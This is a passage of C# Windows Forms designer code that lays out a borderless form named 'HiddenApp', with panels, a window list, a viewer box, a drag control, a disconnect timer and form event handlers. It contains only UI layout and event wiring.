        this.PanelRight.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
        this.PanelRight.BackgroundColor = System.Drawing.Color.Gainsboro;
        this.PanelRight.BackgroundImage = (System.Drawing.Image)resources.GetObject("PanelRight.BackgroundImage");
        this.PanelRight.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
        this.PanelRight.BorderColor = System.Drawing.Color.White;
        this.PanelRight.BorderRadius = 30;
        this.PanelRight.BorderThickness = 1;
        this.PanelRight.Location = new System.Drawing.Point(681, 108);
        this.PanelRight.Name = "PanelRight";
        this.PanelRight.ShowBorders = true;
        this.PanelRight.Size = new System.Drawing.Size(25, 340);
        this.PanelRight.TabIndex = 591;
        this.FormDragControl1.Fixed = true;
        this.FormDragControl1.Horizontal = true;
        this.FormDragControl1.TargetControl = this.PanelTitle;
        this.FormDragControl1.Vertical = true;
        this.TimerIsDisconnect.Interval = 2000;
        this.TimerIsDisconnect.Tick += new System.EventHandler(TimerIsDisconnect_Tick);
        base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
        base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
        this.BackColor = System.Drawing.Color.Gainsboro;
        base.ClientSize = new System.Drawing.Size(715, 583);
        base.Controls.Add(this.panelForm);
        base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
        base.Icon = (System.Drawing.Icon)resources.GetObject("$this.Icon");
        base.Name = "HiddenApp";
        base.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
        this.Text = "HiddenApp";
        base.TransparencyKey = System.Drawing.Color.Gainsboro;
        base.FormClosing += new System.Windows.Forms.FormClosingEventHandler(HiddenApp_FormClosing);
        base.Load += new System.EventHandler(HiddenApp_Load);
        base.Shown += new System.EventHandler(HiddenApp_Shown);
        base.ResizeEnd += new System.EventHandler(HiddenApp_ResizeEnd);
        this.panelForm.ResumeLayout(false);
        this.PanelMune.ResumeLayout(false);
        this.PanelMune.PerformLayout();
        ((System.ComponentModel.ISupportInitialize)this.pictureBox2).EndInit();
        this.panel1.ResumeLayout(false);
        this.tableLayoutPanel1.ResumeLayout(false);
        ((System.ComponentModel.ISupportInitialize)this.ListWindows).EndInit();
        this.contextMenuStrip1.ResumeLayout(false);
        ((System.ComponentModel.ISupportInitialize)this.ViewerBox).EndInit();
        this.PanelTitle.ResumeLayout(false);
        this.PanelTitle.PerformLayout();
        ((System.ComponentModel.ISupportInitialize)this.ImageLogo).EndInit();
        base.ResumeLayout(false);
    }
}
